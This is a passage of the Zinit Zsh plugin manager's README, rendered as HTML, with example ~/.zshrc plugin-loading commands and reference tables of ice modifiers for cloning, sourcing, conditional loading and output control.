&lt;p&gt;&lt;a href="http://zdharma.org/zinit/wiki/INTRODUCTION/" rel="nofollow"&gt;Click here to read the introduction to Zinit&lt;/a&gt;. It explains basic usage and some of the more unique features of Zinit such as the Turbo mode. If you're new to Zinit we highly recommend you read it at least once.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-example-usage" class="anchor" aria-hidden="true" href="#example-usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Example Usage&lt;/h2&gt;
&lt;p&gt;After installing Zinit you can start adding some actions (load some plugins) to &lt;code&gt;~/.zshrc&lt;/code&gt;, at bottom. Some examples:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Two regular plugins loaded without tracking.&lt;/span&gt;
zinit light zsh-users/zsh-autosuggestions
zinit light zdharma/fast-syntax-highlighting

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Plugin history-search-multi-word loaded with tracking.&lt;/span&gt;
zinit load zdharma/history-search-multi-word

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Load the pure theme, with zsh-async library that's bundled with it.&lt;/span&gt;
zinit ice pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;async.zsh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; src&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;pure.zsh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light sindresorhus/pure

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Binary release in archive, from GitHub-releases page.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; After automatic unpacking it provides program "fzf".&lt;/span&gt;
zinit ice from&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;gh-r&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit load junegunn/fzf-bin

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; One other binary release, it needs renaming from `docker-compose-Linux-x86_64`.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; This is done by ice-mod `mv'{from} -&amp;gt; {to}'. There are multiple packages per&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; single version, for OS X, Linux and Windows – so ice-mod `bpick' is used to&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; select Linux package – in this case this is actually not needed, Zinit will&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; grep operating system name and architecture automatically when there's no `bpick'.&lt;/span&gt;
zinit ice from&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;gh-r&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; mv&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;docker* -&amp;gt; docker-compose&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; bpick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;*linux*&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit load docker/compose

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Vim repository on GitHub – a typical source code that needs compilation – Zinit&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; can manage it for you if you like, run `./configure` and other `make`, etc. stuff.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Ice-mod `pick` selects a binary program to add to $PATH. You could also install the&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; package under the path $ZPFX, see: http://zdharma.org/zinit/wiki/Compiling-programs&lt;/span&gt;
zinit ice as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atclone&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;rm -f src/auto/config.cache; ./configure&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
    atpull&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;%atclone&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; make pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;src/vim&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light vim/vim

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Scripts that are built at install (there's single default make target, "install",&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; and it constructs scripts by `cat'ing a few files). The make'' ice could also be:&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; `make"install PREFIX=$ZPFX"`, if "install" wouldn't be the only, default target.&lt;/span&gt;
zinit ice as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-smi"&gt;$ZPFX&lt;/span&gt;/bin/git-*&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; make&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;PREFIX=&lt;span class="pl-smi"&gt;$ZPFX&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light tj/git-extras

&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; Handle completions without loading any plugin, see "clist" command.&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; This one is to be ran just once, in interactive session.&lt;/span&gt;
zinit creinstall %HOME/my_completions&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; For GNU ls (the binaries can be gls, gdircolors, e.g. on OS X when installing the&lt;/span&gt;
&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; coreutils package from Homebrew; you can also use https://github.com/ogham/exa)&lt;/span&gt;
zinit ice atclone&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;dircolors -b LS_COLORS &amp;gt; c.zsh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; atpull&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;%atclone&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; pick&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;c.zsh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; nocompile&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;!&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt;
zinit light trapd00r/LS_COLORS&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href="http://zdharma.org/zinit/wiki/LS_COLORS-explanation/" rel="nofollow"&gt;You can see an extended explanation of LS_COLORS in the wiki.&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; make'!...' -&amp;gt; run make before atclone &amp;amp; atpull&lt;/span&gt;
zinit ice as&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;program&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; make&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;!&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; atclone&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;./direnv hook zsh &amp;gt; zhook.zsh&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; atpull&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;%atclone&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; src&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;zhook.zsh&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
zinit light direnv/direnv&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href="http://zdharma.org/zinit/wiki/Direnv-explanation/" rel="nofollow"&gt;You can see an extended explanation of direnv in the wiki.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;If you're interested in more examples then check out the &lt;a href="https://github.com/zdharma/zinit-configs"&gt;zinit-configs
repository&lt;/a&gt; where users have uploaded their
&lt;code&gt;~/.zshrc&lt;/code&gt; and Zinit configurations. Feel free to
&lt;a href="https://github.com/zdharma/zinit-configs/issues/new?template=request-to-add-zshrc-to-the-zinit-configs-repo.md"&gt;submit&lt;/a&gt;
your &lt;code&gt;~/.zshrc&lt;/code&gt; there if it contains Zinit commands.&lt;/p&gt;
&lt;p&gt;You can also check out the &lt;a href="http://zdharma.org/zinit/wiki/GALLERY/" rel="nofollow"&gt;Gallery of Zinit Invocations&lt;/a&gt; for some additional examples.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-ice-modifiers" class="anchor" aria-hidden="true" href="#ice-modifiers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Ice Modifiers&lt;/h2&gt;
&lt;p&gt;Following &lt;code&gt;ice&lt;/code&gt; modifiers are to be
&lt;a href="http://zdharma.org/zinit/wiki/Alternate-Ice-Syntax/" rel="nofollow"&gt;passed&lt;/a&gt; to &lt;code&gt;zinit ice ...&lt;/code&gt; to
obtain described effects.  The word &lt;code&gt;ice&lt;/code&gt; means something that's added (like ice to a
drink) – and in Zinit it means adding modifier to a next &lt;code&gt;zinit&lt;/code&gt; command, and also
something that's temporary because it melts – and this means that the modification will
last only for a &lt;strong&gt;single&lt;/strong&gt; next &lt;code&gt;zinit&lt;/code&gt; command.&lt;/p&gt;
&lt;p&gt;Some Ice-modifiers are highlighted and clicking on them will take you to the
appropriate wiki page for an extended explanation.&lt;/p&gt;
&lt;p&gt;You may safely assume a given ice works with both plugins and snippets unless
explicitly stated otherwise.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-cloning-options" class="anchor" aria-hidden="true" href="#cloning-options"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Cloning Options&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;proto&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Change protocol to &lt;code&gt;git&lt;/code&gt;,&lt;code&gt;ftp&lt;/code&gt;,&lt;code&gt;ftps&lt;/code&gt;,&lt;code&gt;ssh&lt;/code&gt;, &lt;code&gt;rsync&lt;/code&gt;, etc. Default is &lt;code&gt;https&lt;/code&gt;. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt; &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Private-Repositories/" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;from&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Clone plugin from given site. Supported are &lt;code&gt;from"github"&lt;/code&gt; (default), &lt;code&gt;..."github-rel"&lt;/code&gt;, &lt;code&gt;..."gitlab"&lt;/code&gt;, &lt;code&gt;..."bitbucket"&lt;/code&gt;, &lt;code&gt;..."notabug"&lt;/code&gt; (short names: &lt;code&gt;gh&lt;/code&gt;, &lt;code&gt;gh-r&lt;/code&gt;, &lt;code&gt;gl&lt;/code&gt;, &lt;code&gt;bb&lt;/code&gt;, &lt;code&gt;nb&lt;/code&gt;). Can also be a full domain name (e.g. for GitHub enterprise). &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;ver&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Used with &lt;code&gt;from"gh-r"&lt;/code&gt; (i.e. downloading a binary release, e.g. for use with &lt;code&gt;as"program"&lt;/code&gt;) – selects which version to download. Default is latest, can also be explicitly &lt;code&gt;ver"latest"&lt;/code&gt;. Works also with regular plugins, checkouts e.g. &lt;code&gt;ver"abranch"&lt;/code&gt;, i.e. a specific version. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;bpick&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Used to select which release from GitHub Releases to download, e.g. &lt;code&gt;zini ice from"gh-r" as"program" bpick"*Darwin*"; zini load docker/compose&lt;/code&gt;. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt; &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;depth&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Pass &lt;code&gt;--depth&lt;/code&gt; to &lt;code&gt;git&lt;/code&gt;, i.e. limit how much of history to download. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cloneopts&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Pass the contents of &lt;code&gt;cloneopts&lt;/code&gt; to &lt;code&gt;git clone&lt;/code&gt;. Defaults to &lt;code&gt;--recursive&lt;/code&gt; i.e. Change cloning options. &lt;strong&gt;Does not work with snippets.&lt;/strong&gt; &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;svn&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Use Subversion for downloading snippet. GitHub supports &lt;code&gt;SVN&lt;/code&gt; protocol, this allows to clone subdirectories as snippets, e.g. &lt;code&gt;zinit ice svn; zinit snippet OMZ::plugins/git&lt;/code&gt;. Other ice &lt;code&gt;pick&lt;/code&gt; can be used to select file to source (default are: &lt;code&gt;*.plugin.zsh&lt;/code&gt;, &lt;code&gt;init.zsh&lt;/code&gt;, &lt;code&gt;*.zsh-theme&lt;/code&gt;). &lt;strong&gt;Does not work with plugins.&lt;/strong&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-selection-of-files-to-source-" class="anchor" aria-hidden="true" href="#selection-of-files-to-source-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Selection of Files (To Source, …)&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Sourcing-multiple-files/" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;pick&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Select the file to source, or the file to set as command (when using &lt;code&gt;snippet --command&lt;/code&gt; or the ice &lt;code&gt;as"program"&lt;/code&gt;); it is a pattern, alphabetically first matched file is being chosen; e.g. &lt;code&gt;zinit ice pick"*.plugin.zsh"; zinit load …&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Sourcing-multiple-files" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;src&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Specify additional file to source after sourcing main file or after setting up command (via &lt;code&gt;as"program"&lt;/code&gt;). It is not a pattern but a plain file name.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Sourcing-multiple-files" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;multisrc&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Allows to specify multiple files for sourcing, enumerated with spaces as the separators (e.g. &lt;code&gt;multisrc'misc.zsh grep.zsh'&lt;/code&gt;) and also using brace-expansion syntax (e.g. &lt;code&gt;multisrc'{misc,grep}.zsh'&lt;/code&gt;). Supports patterns.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-conditional-loading" class="anchor" aria-hidden="true" href="#conditional-loading"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conditional Loading&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Example-wait-conditions" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;wait&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Postpone loading a plugin or snippet. For &lt;code&gt;wait'1'&lt;/code&gt;, loading is done &lt;code&gt;1&lt;/code&gt; second after prompt. For &lt;code&gt;wait'[[ ... ]]'&lt;/code&gt;, &lt;code&gt;wait'(( ... ))'&lt;/code&gt;, loading is done when given condition is meet. For &lt;code&gt;wait'!...'&lt;/code&gt;, prompt is reset after load. Zsh can start 80% (i.e.: 5x) faster thanks to postponed loading. &lt;strong&gt;Fact:&lt;/strong&gt; when &lt;code&gt;wait&lt;/code&gt; is used without value, it works as &lt;code&gt;wait'0'&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Multiple-prompts" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;load&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; A condition to check which should cause plugin to load. It will load once, the condition can be still true, but will not trigger second load (unless plugin is unloaded earlier, see &lt;code&gt;unload&lt;/code&gt; below). E.g.: &lt;code&gt;load'[[ $PWD = */github* ]]'&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;a href="http://zdharma.org/zinit/wiki/Multiple-prompts" rel="nofollow"&gt;&lt;strong&gt;&lt;code&gt;unload&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; A condition to check causing plugin to unload. It will unload once, then only if loaded again. E.g.: &lt;code&gt;unload'[[ $PWD != */github* ]]'&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;cloneonly&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Don't load the plugin / snippet, only download it &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;if&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Load plugin or snippet only when given condition is fulfilled, for example: &lt;code&gt;zinit ice if'[[ -n "$commands[otool]" ]]'; zinit load ...&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;has&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Load plugin or snippet only when given command is available (in $PATH), e.g. &lt;code&gt;zinit ice has'git' ...&lt;/code&gt; &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;subscribe&lt;/code&gt; / &lt;code&gt;on-update-of&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Postpone loading of a plugin or snippet until the given file(s) get updated, e.g. &lt;code&gt;subscribe'{~/files-*,/tmp/files-*}'&lt;/code&gt; &lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;trigger-load&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt;Creates a function that loads the associated plugin/snippet, with an option (to use it, precede the ice content with &lt;code&gt;!&lt;/code&gt;) to automatically forward the call afterwards, to a command of the same name as the function. Can obtain multiple functions to create – sparate with &lt;code&gt;;&lt;/code&gt;.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3&gt;&lt;a id="user-content-plugin-output" class="anchor" aria-hidden="true" href="#plugin-output"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Plugin Output&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="center"&gt;Modifier&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;silent&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Mute plugin's or snippet's &lt;code&gt;stderr&lt;/code&gt; &amp;amp; &lt;code&gt;stdout&lt;/code&gt;. Also skip &lt;code&gt;Loaded ...&lt;/code&gt; message under prompt for &lt;code&gt;wait&lt;/code&gt;, etc. loaded plugins, and completion-installation messages.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;lucid&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Skip &lt;code&gt;Loaded ...&lt;/code&gt; message under prompt for &lt;code&gt;wait&lt;/code&gt;, etc. loaded plugins (a subset of &lt;code&gt;silent&lt;/code&gt;).&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="center"&gt;&lt;code&gt;notify&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;div align="justify"&gt; Output given message under-prompt after successfully loading a plugin/snippet. In case of problems with the loading, output a warning message and the return code. If starts with &lt;code&gt;!&lt;/code&gt; it will then always output the given message. Hint: if the message is empty, then it will just notify about problems.&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
